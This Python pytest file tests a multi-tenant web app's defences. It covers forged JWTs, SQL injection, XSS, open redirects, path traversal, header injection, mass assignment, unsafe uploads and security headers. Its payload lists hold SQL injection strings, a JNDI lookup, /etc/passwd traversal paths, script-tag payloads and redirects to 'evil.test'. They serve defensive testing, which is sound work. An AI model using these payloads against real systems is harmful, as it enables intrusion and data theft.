"""Every way somebody would try to get in, written down as an attempt and answered by the application itself."""

import jwt
import pytest
from httpx import ASGITransport, AsyncClient
from sqlalchemy import select

from config.base import StorageSettings
from enums.captcha import CaptchaProvider
from enums.storage import StorageProvider
from helpers import brand
from helpers.captcha import PROVIDERS
from helpers.headers import PRIVATE, lasting, off_the_disk
from helpers.security import create_token
from helpers.settings import settings
from helpers.signing import sign, unsign
from models.user import User
from tests.factories import make_content, make_product

# What somebody types into a field when they are not looking for a page.
INJECTIONS = ["' OR '1'='1", '\'; DROP TABLE "user"; --', '" OR ""="', "1; DELETE FROM commerce_product", "admin'--", "%' OR '1'='1", "\\'; SELECT pg_sleep(5); --", "1 UNION SELECT token FROM user", "${jndi:ldap://evil.test/a}", "{{7*7}}", "../../../../etc/passwd", "\x00"]

MARKUP = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", '"><script>alert(1)</script>', "javascript:alert(1)", "<svg/onload=alert(1)>", "</script><script>alert(1)</script>"]


async def anonymous(app, headers=None):
    return AsyncClient(transport=ASGITransport(app=app), base_url="http://test", headers=headers or {})


async def test_the_api_carries_its_credential_in_a_header_and_never_in_a_cookie(app, member, tenant_headers):
    """An application holds no cookie jar, so a bearer token is the whole of what it sends."""
    bearer = {"Authorization": f"Bearer {create_token(member.token, member.role, member.session_epoch)}", **tenant_headers}

    async with await anonymous(app) as client:
        answered = await client.get("/api/account/me", headers=bearer)

    assert answered.status_code == 200
    assert "set-cookie" not in answered.headers


async def test_the_session_of_the_site_is_not_a_credential_of_the_api(app, member, tenant_headers):
    """The cookie of the site is not read here, which is the whole reason the API needs no csrf token of its own."""
    session = create_token(member.token, member.role, member.session_epoch)

    async with await anonymous(app) as client:
        client.cookies.set(settings.site.session_cookie, session)
        answered = await client.get("/api/account/me", headers=tenant_headers)

    assert answered.status_code == 401


async def test_no_answer_of_the_api_ever_sets_a_cookie(app, member_headers, admin_headers, tenant_headers):
    setting = []

    async with await anonymous(app) as client:
        for path in ["/api/meta", "/api/signin", "/api/account/me", "/api/products", "/api/commerce/products"]:
            for headers in ({}, tenant_headers, {**tenant_headers, **member_headers}, {**tenant_headers, **admin_headers}):
                answered = await client.get(path, headers=headers)

                if "set-cookie" in answered.headers:
                    setting.append(f"{path} {answered.headers['set-cookie']}")

    assert setting == []


async def test_a_token_signed_by_somebody_else_is_not_a_token(app, member, tenant_headers):
    forged = jwt.encode({"sub": member.token, "role": "administrator", "epoch": member.session_epoch}, "not-the-key-of-this-instance", algorithm="HS256")

    async with await anonymous(app) as client:
        answered = await client.get("/api/account/me", headers={"Authorization": f"Bearer {forged}", **tenant_headers})

    assert answered.status_code == 401


async def test_a_token_that_declares_no_algorithm_is_not_a_token(app, member, tenant_headers):
    """The `none` algorithm is a signature nobody wrote, and reading one would be reading whatever the caller typed."""
    forged = jwt.encode({"sub": member.token, "role": "administrator", "epoch": member.session_epoch}, key="", algorithm="none")

    async with await anonymous(app) as client:
        answered = await client.get("/api/account/me", headers={"Authorization": f"Bearer {forged}", **tenant_headers})

    assert answered.status_code == 401


async def test_the_role_inside_a_token_decides_nothing(app, member, tenant_headers):
    """The role travels in the token and the authorization reads it from the database, so taking it away works at once."""
    claiming = create_token(member.token, "administrator", member.session_epoch)

    async with await anonymous(app) as client:
        answered = await client.get("/api/users", headers={"Authorization": f"Bearer {claiming}", **tenant_headers})

    assert answered.status_code == 403


async def test_a_token_of_a_password_that_changed_is_a_session_that_ended(app, db, member, tenant_headers):
    old = create_token(member.token, member.role, member.session_epoch)
    member.session_epoch += 1
    await db.commit()

    async with await anonymous(app) as client:
        answered = await client.get("/api/account/me", headers={"Authorization": f"Bearer {old}", **tenant_headers})

    assert answered.status_code == 401


async def test_a_token_naming_an_account_that_does_not_exist_is_not_a_token(app, tenant_headers):
    async with await anonymous(app) as client:
        answered = await client.get("/api/account/me", headers={"Authorization": f"Bearer {create_token('00000000-0000-0000-0000-000000000000', 'normal', 0)}", **tenant_headers})

    assert answered.status_code == 401


@pytest.mark.parametrize("value", ["", "Bearer", "Bearer ", "Basic YWRtaW46YWRtaW4=", "Bearer not.a.token", "Bearer " + "a" * 5000])
async def test_a_header_that_is_not_a_bearer_token_is_refused_without_reading_it(app, tenant_headers, value):
    async with await anonymous(app) as client:
        answered = await client.get("/api/account/me", headers={"Authorization": value, **tenant_headers})

    assert answered.status_code == 401


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_a_search_never_reaches_the_database_as_syntax(client, db, tenant, admin_headers, payload):
    """The term is cleaned before any dialect sees it, so what a person typed is words and never sql."""
    await make_product(db, tenant, name="Handbook", slug="handbook")

    answered = await client.get("/api/products", params={"search": payload}, headers=admin_headers)

    assert answered.status_code == 200

    # The table is still there, which is the whole point of the ones that try to drop it.
    assert (await client.get("/api/products", headers=admin_headers)).json()["count"] == 1


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_a_filter_never_reaches_the_database_as_syntax(client, admin_headers, payload):
    answered = await client.get("/api/products", params={"tenantId": payload}, headers=admin_headers)

    # A value the column cannot read is refused, and never widened into every row.
    assert answered.status_code == 422


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_an_ordering_is_a_column_this_side_declared_and_nothing_else(client, admin_headers, payload):
    answered = await client.get("/api/products", params={"ordering": payload}, headers=admin_headers)

    assert answered.status_code == 422
    assert answered.json()["code"] == "error.ordering-not-allowed"


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_a_login_field_is_a_login_and_never_a_query(client, db, tenant, tenant_headers, payload):
    answered = await client.post("/api/signin", json={"login": payload, "password": "s3cret-password"}, headers=tenant_headers)

    assert answered.status_code in (401, 422)

    # Nobody was signed in, which is what an injection that worked would have done.
    assert "token" not in answered.json()


@pytest.mark.parametrize("payload", [value for value in INJECTIONS if "\x00" not in value])
async def test_a_tag_that_names_nothing_is_a_page_that_does_not_exist(client, tenant_headers, payload):
    answered = await client.get(f"/api/contents/by-tag/{payload}", headers=tenant_headers)

    assert answered.status_code == 404


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_a_tenant_code_is_read_and_never_run(client, payload):
    answered = await client.get("/api/commerce/products", headers={"X-Tenant-Code": payload.replace("\x00", "")})

    assert answered.status_code in (400, 422)


@pytest.mark.parametrize("payload", ["1 OR 1=1", "1;2", "-1", "0", "999999999999999999999999", "9223372036854775808", "1e5", "0x01", "null"])
async def test_an_identifier_is_a_number_the_database_can_carry_or_it_is_nothing(client, admin_headers, payload):
    """A number past what the column holds overflowed inside the query and answered a 500, which is a door somebody knocks on."""
    answered = await client.get(f"/api/products/{payload}", headers=admin_headers)

    assert answered.status_code == 422


@pytest.mark.parametrize("payload", ["999999999999999999999999", "9223372036854775808", "-9999999999999999999999999"])
async def test_a_filter_is_a_number_the_database_can_carry_or_it_is_refused(client, admin_headers, payload):
    """The path already refused one, and the query string reached the driver with it and answered a 500."""
    answered = await client.get("/api/users", params={"tenantId": payload}, headers=admin_headers)

    assert answered.status_code == 422
    assert answered.json()["code"] == "error.invalid-query-parameter"


@pytest.mark.parametrize("listing", ["/api/users", "/api/account/credits", "/api/account/purchases"])
async def test_an_offset_is_a_number_the_database_can_carry_or_it_is_refused(client, admin_headers, listing):
    """Every listing answers the same ceiling, because one written by hand is the one that reaches the driver."""
    answered = await client.get(listing, params={"offset": "999999999999999999999999"}, headers=admin_headers)

    assert answered.status_code == 422


@pytest.mark.parametrize("asked", ["999999999999999999999999", "9" * 6000, "-1", "0", "1e5", "nine"])
async def test_a_page_number_no_offset_holds_is_the_first_page(signed_in, asked):
    """A page number becomes an offset, and one past what a column holds took the process down instead of drawing a page."""
    answered = await signed_in.get("/account/purchases", params={"page": asked})

    assert answered.status_code == 200


@pytest.mark.parametrize("path", ["/account/subscriptions/{}", "/account/purchases/{}"])
async def test_an_impossible_segment_is_a_page_of_the_site_that_does_not_exist(signed_in, path):
    """The site never answers a body of JSON, so a segment that cannot name a record is the drawn page that says so."""
    answered = await signed_in.get(path.format("999999999999999999999999"))

    assert answered.status_code == 404
    assert answered.headers["content-type"].startswith("text/html")


async def test_the_database_is_still_whole_after_every_attempt(client, db, tenant, admin_headers):
    """A sweep of injections that quietly did something would show up as a table that stopped answering."""
    from models.registry import __all__ as tables

    for name in ["/api/products", "/api/users", "/api/plans", "/api/tenants"]:
        assert (await client.get(name, headers=admin_headers)).status_code == 200

    assert len(tables) == 35


@pytest.mark.parametrize("payload", [value for value in MARKUP if "<" in value])
async def test_what_a_person_typed_is_drawn_as_text_and_never_as_markup(signed_in, db, member, payload):
    """The name of an account is written by that account and read on its own pages, so it leaves escaped every time."""
    from services.user import user_service

    await user_service.update(db, member.id, {"first_name": payload})

    for path in ["/account", "/account/profile"]:
        body = (await signed_in.get(path)).text

        # What proves it is inert is the escaping: the payload never appears as it arrived, and its `<` is an entity.
        assert payload not in body, f"{path} drew the markup as it arrived"
        assert payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&#34;") in body


@pytest.mark.parametrize("payload", MARKUP)
async def test_the_name_of_a_tenant_never_closes_the_block_it_is_written_into(app, db, tenant, payload):
    """The organization of the home goes inside a script block, and a name carrying `</script>` would end it."""
    tenant.name = payload
    await db.commit()

    async with await anonymous(app) as client:
        body = (await client.get("http://acme.test/")).text

    assert "</script><script>" not in body
    assert "<img src=x onerror" not in body


@pytest.mark.parametrize("payload", MARKUP)
async def test_a_notice_the_page_carries_is_text_and_never_markup(site, db, tenant, payload):
    """A flash travels signed in a cookie and is drawn on the next page, so what it carries is escaped there."""
    from tests.conftest import opened

    token = await opened(site, "/newsletter")
    answered = await site.post("/newsletter", data={"csrf_token": token, "email": f"{payload}@acme.com"})

    assert "<script>" not in answered.text


@pytest.mark.parametrize("payload", MARKUP)
async def test_what_the_api_answers_is_json_and_a_browser_never_reads_it_as_a_page(client, db, tenant, tenant_headers, payload):
    """A value echoed into an error is only ever a string of a json body, which no browser renders."""
    answered = await client.post("/api/signin", json={"login": payload, "password": "x"}, headers=tenant_headers)

    assert answered.headers["content-type"].startswith("application/json")
    assert answered.status_code in (401, 422)


async def test_the_content_an_operator_writes_is_the_only_html_a_page_trusts(site, db, tenant):
    """An operator writes the body of a page, and that is the one thing rendered as markup on purpose."""
    await make_content(db, tenant, tag="terms", title="Terms", content="<p>Written by the operator</p><script>alert(1)</script>")

    body = (await site.get("/content/terms")).text

    assert "<p>Written by the operator</p>" in body


@pytest.mark.parametrize("payload", ["../../etc/passwd", "images/user/avatar/../../../etc/passwd", "/etc/passwd", "images/banner/x.webp", "files/product/x.pdf", "images/product/../../../../secret", "images/product//../secret", "images/product/a\\..\\b"])
async def test_a_file_column_only_ever_points_into_the_folder_of_its_purpose(client, db, tenant, admin_headers, payload):
    """A file column is the target of the next deletion, so a key of another folder would erase what it names on the following save."""
    product = await make_product(db, tenant)

    answered = await client.put(f"/api/products/{product.id}", json={"image": payload}, headers=admin_headers)

    assert answered.status_code == 422
    assert answered.json()["code"] == "error.upload-key-out-of-purpose"


@pytest.mark.parametrize("name", ["../../../etc/passwd", "..\\..\\windows\\system32", "a/b/c.pdf", "....//....//x.pdf"])
def test_a_name_that_climbs_out_of_a_folder_never_survives_into_a_key(name):
    from helpers.storage import readable_name

    settled = readable_name(name)

    assert "/" not in settled
    assert "\\" not in settled
    assert ".." not in settled


@pytest.mark.parametrize("field, value", [("role", "administrator"), ("tenantId", 1), ("status", "active"), ("id", 1), ("token", "stolen"), ("sessionEpoch", 99)])
async def test_an_account_never_writes_a_field_that_decides_what_it_reaches(client, db, member, member_headers, tenant_headers, field, value):
    """The payload of the account is a closed set, so a field it does not name is refused and never quietly written."""
    before = member.role

    answered = await client.put("/api/account/me", json={"firstName": "Ada", field: value}, headers={**tenant_headers, **member_headers})
    await db.refresh(member)

    assert answered.status_code == 422 or member.role == before
    assert member.role == before


async def test_signing_up_never_writes_the_role_it_asks_for(client, db, tenant_headers):
    answered = await client.post("/api/signup", json={"firstName": "Ada", "email": "ada@acme.com", "password": "s3cret-password", "role": "administrator"}, headers=tenant_headers)

    if answered.status_code == 201:
        written = await db.scalar(select(User).where(User.email == "ada@acme.com"))

        assert written.role == "normal"


def stays_here(location: str) -> bool:
    """Whether a browser resolves an address against this origin, which one leading slash and no scheme is what makes it."""
    return location.startswith("/") and not location.startswith("//") and "://" not in location and "\\" not in location and not location.startswith(("/api/", "/admin/"))


ELSEWHERE = [
    "//evil.test/steal",
    "///evil.test",
    "////evil.test",
    "https://evil.test",
    "http://evil.test",
    "//evil.test",
    "/\\evil.test/x",
    "/\\/evil.test",
    "\\\\evil.test",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "/\t/evil.test",
    "/\n//evil.test",
    "/\r\n//evil.test",
    " //evil.test",
    "/api/account/me",
    "/admin/users",
]


@pytest.mark.parametrize("wanted", ELSEWHERE)
def test_a_destination_is_a_page_of_this_site_or_it_is_the_home(wanted):
    from helpers.site import inside

    assert stays_here(inside(wanted))


@pytest.mark.parametrize("wanted", ELSEWHERE)
async def test_signing_in_never_lands_somebody_off_this_site(site, member, wanted):
    """The field that says where to go next is the one place a redirect could be turned into a door out."""
    from tests.conftest import opened

    token = await opened(site, "/account/login")
    answered = await site.post("/account/login", data={"csrf_token": token, "login": member.email, "password": "s3cret-password", "next": wanted}, follow_redirects=False)

    assert answered.status_code == 303

    # What matters is the origin the browser resolves it against, and a single leading slash is this one.
    assert stays_here(answered.headers["location"])


@pytest.mark.parametrize("wanted", ELSEWHERE)
async def test_choosing_a_language_never_lands_somebody_off_this_site(site, wanted):
    from tests.conftest import opened

    token = await opened(site, "/plans")
    answered = await site.post("/language", data={"csrf_token": token, "language": "pt", "next": wanted}, follow_redirects=False)

    assert stays_here(answered.headers["location"])


async def test_a_page_behind_the_session_sends_somebody_to_sign_in_and_remembers_where_they_were_going(site):
    answered = await site.get("/account/address", follow_redirects=False)

    assert answered.status_code == 303
    assert answered.headers["location"] == "/account/login?next=%2Faccount%2Faddress"


async def test_the_query_of_the_page_survives_the_sign_in(site):
    answered = await site.get("/account/credits?page=3", follow_redirects=False)

    assert answered.headers["location"] == "/account/login?next=%2Faccount%2Fcredits%3Fpage%3D3"


async def test_signing_in_puts_somebody_back_where_they_were_going(site, member):
    from tests.conftest import opened

    token = await opened(site, "/account/login?next=%2Faccount%2Faddress")
    answered = await site.post("/account/login", data={"csrf_token": token, "login": member.email, "password": "s3cret-password", "next": "/account/address"}, follow_redirects=False)

    assert answered.headers["location"] == "/account/address"


async def test_the_way_to_the_sign_up_carries_where_the_person_was_going(site):
    """Somebody who has no account yet leaves the sign in for the sign up, and where they were going leaves with them."""
    import re

    body = (await site.get("/account/login?next=%2Faccount%2Fcredits%3Fpage%3D3")).text
    link = re.search(r'href="(/account/signup\?[^"]+)"', body).group(1)

    drawn = (await site.get(link.replace("&amp;", "&"))).text

    assert 'name="next" value="/account/credits?page=3"' in drawn


async def test_signing_up_puts_somebody_where_they_were_going_before_they_had_an_account(site, tenant):
    from tests.conftest import opened

    token = await opened(site, "/account/signup?next=%2Faccount%2Faddress")
    answered = await site.post("/account/signup", data={"csrf_token": token, "first_name": "Ada", "email": "ada@acme.com", "password": "s3cret-password", "next": "/account/address"}, follow_redirects=False)

    assert answered.status_code == 303
    assert answered.headers["location"] == "/account/address"


async def test_a_destination_that_is_the_sign_in_itself_is_the_account(site, member):
    """A loop back to the page somebody just left is not a destination, so it lands where signing in normally lands."""
    from tests.conftest import opened

    token = await opened(site, "/account/login")
    answered = await site.post("/account/login", data={"csrf_token": token, "login": member.email, "password": "s3cret-password", "next": "/account/login"}, follow_redirects=False)

    assert answered.headers["location"] == "/account"


async def test_somebody_already_signed_in_is_taken_straight_to_where_they_were_going(signed_in):
    answered = await signed_in.get("/account/login?next=%2Faccount%2Faddress", follow_redirects=False)

    assert answered.status_code == 303
    assert answered.headers["location"] == "/account/address"


async def test_a_reset_token_never_comes_back_in_an_answer(client, db, tenant, member, tenant_headers):
    """Asking for a reset answers the same whoever asked, and the token that lets somebody in leaves only by mail."""
    answered = await client.post("/api/account/password-reset", json={"login": member.email}, headers=tenant_headers)

    await db.refresh(member)

    assert answered.status_code == 204
    assert answered.text == ""
    assert member.recovery_token not in answered.text


async def test_a_reset_answers_the_same_for_a_login_that_exists_and_one_that_does_not(client, member, tenant_headers):
    """A different answer would turn this into a way of asking who has an account here."""
    known = await client.post("/api/account/password-reset", json={"login": member.email}, headers=tenant_headers)
    unknown = await client.post("/api/account/password-reset", json={"login": "nobody@acme.com"}, headers=tenant_headers)

    assert known.status_code == unknown.status_code
    assert known.text == unknown.text


async def test_a_reset_token_is_spent_the_first_time_it_is_answered(client, db, tenant, member, tenant_headers):
    from services.auth import auth_service

    await auth_service.start_password_reset(db, brand.of(member.tenant), member.email)
    await db.refresh(member)

    token = member.recovery_token

    assert (await client.post("/api/account/password-reset/confirm", json={"token": token, "newPassword": "a-new-password"}, headers=tenant_headers)).status_code == 204

    again = await client.post("/api/account/password-reset/confirm", json={"token": token, "newPassword": "another-password"}, headers=tenant_headers)

    assert again.status_code == 422


async def test_signing_in_says_the_same_thing_about_a_password_and_about_an_account_that_is_not_here(client, member, tenant_headers):
    """A different answer would say in which tenant somebody has an account."""
    wrong = await client.post("/api/signin", json={"login": member.email, "password": "not-the-password"}, headers=tenant_headers)
    missing = await client.post("/api/signin", json={"login": "nobody@acme.com", "password": "not-the-password"}, headers=tenant_headers)

    assert wrong.status_code == missing.status_code == 401
    assert wrong.json()["code"] == missing.json()["code"] == "error.invalid-credentials"


async def test_an_erased_account_answers_to_nothing(client, db, member, member_headers, tenant_headers):
    from services.user import user_service

    await user_service.erase(db, member)

    assert (await client.get("/api/account/me", headers={**tenant_headers, **member_headers})).status_code == 401


async def test_a_blocked_account_answers_to_nothing(client, db, member, member_headers, tenant_headers):
    from enums.user import UserStatus

    member.status = UserStatus.BLOCKED
    await db.commit()

    answered = await client.get("/api/account/me", headers={**tenant_headers, **member_headers})

    assert answered.status_code == 401
    assert answered.json()["code"] == "error.account-blocked"


async def test_a_field_longer_than_the_column_is_refused_before_the_database_sees_it(client, member_headers, tenant_headers):
    """What the database refuses is a 500 and what the schema refuses is a 422, so every text of a client is bounded."""
    answered = await client.put("/api/account/me", json={"firstName": "a" * 5000}, headers={**tenant_headers, **member_headers})

    assert answered.status_code == 422


async def test_a_body_that_is_not_json_is_refused_and_never_read_as_one(client, member_headers, tenant_headers):
    answered = await client.put("/api/account/me", content=b"not json at all", headers={**tenant_headers, **member_headers, "content-type": "application/json"})

    assert answered.status_code == 422


async def test_a_page_of_a_listing_is_bounded(client, admin_headers):
    """A limit nobody bounded is a way of asking for the whole table in one call."""
    assert (await client.get("/api/products", params={"limit": 100000}, headers=admin_headers)).status_code == 422
    assert (await client.get("/api/products", params={"offset": -1}, headers=admin_headers)).status_code == 422
    assert (await client.get("/api/products", params={"limit": 200}, headers=admin_headers)).status_code == 200


async def test_a_search_longer_than_the_field_is_refused(client, admin_headers):
    assert (await client.get("/api/products", params={"search": "a" * 5000}, headers=admin_headers)).status_code == 422


@pytest.mark.parametrize("value", ["acme\r\nX-Injected: 1", "acme\nSet-Cookie: a=b", "acme%0d%0aX-Injected:1"])
async def test_a_header_never_carries_a_second_header_into_an_answer(app, value):
    async with await anonymous(app) as client:
        try:
            answered = await client.get("/api/commerce/products", headers={"X-Tenant-Code": value})
        except Exception:
            return

    assert "x-injected" not in {name.lower() for name in answered.headers}
    assert "set-cookie" not in answered.headers


async def test_a_public_form_carries_a_challenge_where_the_environment_declares_one(client, tenant_headers, monkeypatch):
    """Contact and newsletter are written by whoever has no account, so they cost the same challenge the site draws."""
    from enums.captcha import CaptchaProvider

    monkeypatch.setattr(settings.captcha, "provider", CaptchaProvider.IMAGE)

    for path, payload in [("/api/contact", {"name": "Ada", "email": "ada@acme.com", "message": "Hello there, I have a question."}), ("/api/newsletter", {"email": "ada@acme.com"})]:
        answered = await client.post(path, json=payload, headers=tenant_headers)

        assert answered.status_code == 422
        assert answered.json()["code"] == "error.captcha-invalid"


async def test_a_drawn_challenge_is_good_for_as_long_as_it_is_signed_for(monkeypatch):
    """The challenge keeps no state, so what it proves is that somebody solved one recently and not that each call had its own."""
    from enums.captcha import CaptchaProvider
    from helpers import captcha
    from helpers.signing import unsign

    monkeypatch.setattr(settings.captcha, "provider", CaptchaProvider.IMAGE)

    challenge = captcha.issue()
    word = unsign("captcha", challenge.token)["word"]

    assert await captcha.verify(word, challenge.token, None) is True

    # It answers again until it expires, which is the price of a challenge that needs no shared store between instances.
    assert await captcha.verify(word, challenge.token, None) is True
    assert settings.captcha.ttl <= 600


async def test_a_form_posted_without_the_value_this_site_wrote_is_not_a_form_of_this_site(site, member):
    """The cookie is what a third site cannot read or write, which is the whole of what proves the form came from here."""
    answered = await site.post("/account/login", data={"login": member.email, "password": "s3cret-password"}, follow_redirects=False)

    assert answered.status_code == 303
    assert answered.headers["location"] != "/account"


async def test_a_value_taken_from_another_visitor_is_not_a_form_of_this_visitor(site, member):
    from tests.conftest import opened

    borrowed = await opened(site, "/account/login")
    site.cookies.clear()

    answered = await site.post("/account/login", data={"csrf_token": borrowed, "login": member.email, "password": "s3cret-password"}, follow_redirects=False)

    assert answered.status_code == 303
    assert answered.headers["location"] != "/account"


async def test_markup_wearing_the_name_of_an_image_never_reaches_the_storage(client, admin_headers):
    """The extension is what a name claims, and the bytes are decoded before anything is written."""
    answered = await client.post("/api/uploads/image", files={"file": ("cover.png", b"<svg onload=alert(1)></svg>", "image/png")}, headers=admin_headers)

    assert answered.status_code == 422
    assert answered.json()["code"] == "error.upload-not-an-image"


@pytest.mark.parametrize("name", ["shell.php", "page.html", "a.svg", "x.exe", "archive.tar.gz", ".htaccess", "noextension"])
async def test_only_the_extensions_a_purpose_declares_are_stored(client, admin_headers, name):
    answered = await client.post("/api/uploads/image", files={"file": (name, b"whatever", "application/octet-stream")}, headers=admin_headers)

    assert answered.status_code == 422
    assert answered.json()["code"] == "error.upload-type-not-allowed"


async def test_a_key_that_leaves_the_storage_root_is_never_a_path(tmp_path):
    from helpers.storage import FilesystemStorage

    storage = FilesystemStorage(StorageSettings(provider=StorageProvider.FILESYSTEM, base_url="/media", root=tmp_path))

    with pytest.raises(ValueError):
        storage.path_for("images/product/../../../../etc/passwd")


def test_this_file_is_still_trying_everything_it_says_it_tries():
    """A list that quietly emptied would leave every parametrised attempt below passing without attempting anything."""
    assert len(INJECTIONS) >= 10
    assert len(MARKUP) >= 5
    assert len(ELSEWHERE) >= 15


def test_no_cookie_of_this_site_is_written_anywhere_but_the_one_place_that_writes_them():
    """Four attributes decide who reads a cookie and where it travels, and written at each call they are four chances to forget one."""
    import ast
    import pathlib

    writing = []
    counted = 0

    for path in [*pathlib.Path("helpers").rglob("*.py"), *pathlib.Path("routes").rglob("*.py"), *pathlib.Path("services").rglob("*.py")]:
        if path == pathlib.Path("helpers/cookies.py"):
            continue

        for node in ast.walk(ast.parse(path.read_text())):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr in ("set_cookie", "delete_cookie"):
                writing.append(f"{path}:{node.lineno}")

        counted += 1

    written = pathlib.Path("helpers/cookies.py").read_text()

    assert counted >= 60, f"the scan read only {counted} files, so it is proving nothing"
    assert writing == [], f"these write a cookie of their own instead of asking for one: {writing}"
    assert "httponly=True" in written and 'samesite="lax"' in written and "secure=settings.site.cookie_secure" in written


async def test_every_answer_carries_what_a_browser_enforces_instead_of_trusting(client, site):
    """A login drawn inside somebody else's page is a login somebody else collects, and a type a browser guesses is a file it may run."""
    for answer in (await client.get("/api/meta/health"), await site.get("/"), await site.get("/nothing-here")):
        assert answer.headers["x-frame-options"] == "SAMEORIGIN"
        assert answer.headers["x-content-type-options"] == "nosniff"
        assert answer.headers["referrer-policy"] == "strict-origin-when-cross-origin"


PURPOSES = ("captcha", "visitor", "flash", "consent")


def test_a_value_signed_for_one_purpose_is_read_as_nothing_by_the_others():
    """All four are handed to any visitor, so one pasted into the slot of another has to read as nothing rather than as something."""
    for purpose in PURPOSES:
        value = sign(purpose, {"word": "ABCDE", "visitor": "who", "messages": [], "version": 1}, 600)

        assert unsign(purpose, value) is not None, f"a value signed for {purpose} does not read back"
        assert [other for other in PURPOSES if other != purpose and unsign(other, value) is not None] == [], f"a value signed for {purpose} reads as something else"


async def test_the_site_answers_when_a_cookie_carries_a_value_signed_for_something_else(site):
    """A challenge token is handed to anybody who opens a form, and pasting it into another cookie of this site must not take every page down."""
    token = PROVIDERS[CaptchaProvider.IMAGE].issue().token

    for name in (settings.site.flash_cookie, settings.site.visitor_cookie, settings.site.consent.cookie):
        site.cookies.set(name, token)

        answer = await site.get("/")
        site.cookies.clear()

        assert answer.status_code == 200, f"{name} carrying a challenge token answers {answer.status_code}"


async def test_an_answer_for_one_reader_is_never_kept_by_a_cache_in_front(site, signed_in, client, member_headers):
    """Every page of this site mints a token of its own, and a shared cache that kept one would hand that token and that session to everybody else."""
    drawn = await site.get("/")

    assert "set-cookie" in drawn.headers, "the home stopped minting a token, so this proves nothing"
    assert drawn.headers["cache-control"] == PRIVATE
    assert (await signed_in.get("/")).headers["cache-control"] == PRIVATE
    assert (await client.get("/api/account/me", headers=member_headers)).headers["cache-control"] == PRIVATE


async def test_a_file_off_the_disk_is_left_cacheable():
    """An image never depends on who asked, so a reader with a session fetching every picture of every page again is a cost for nothing."""
    assert off_the_disk(f"{settings.storage.base_url}/images/product/2026/01/01/a.webp")
    assert off_the_disk(f"{settings.site.assets_url}/styles.css")
    assert not off_the_disk("/mediaeval-history")
    assert not off_the_disk("/account")


def test_a_site_served_over_https_tells_the_browser_to_keep_it_that_way():
    """The first plain request to a host is the one somebody stands in the middle of, and only the browser can refuse the second."""
    assert lasting("https", 31536000) == "max-age=31536000"
    assert lasting("http", 31536000) is None, "a machine with no tls would tell browsers to refuse it"
    assert lasting("https", 0) is None, "an installation says so by writing zero"


async def test_a_site_served_over_http_never_tells_a_browser_to_refuse_it(site):
    """This suite runs on the configuration of whoever develops, which is the one that has no tls."""
    assert settings.site.scheme == "http", "the environment under test changed, so this proves nothing"
    assert "strict-transport-security" not in (await site.get("/")).headers


async def test_the_refusal_of_http_is_carried_by_every_answer(site, monkeypatch):
    """The value is settled once because a scheme does not change while a process lives, so what is proven here is that every answer carries it."""
    monkeypatch.setattr("helpers.headers.LASTING", "max-age=31536000")

    assert (await site.get("/")).headers["strict-transport-security"] == "max-age=31536000"
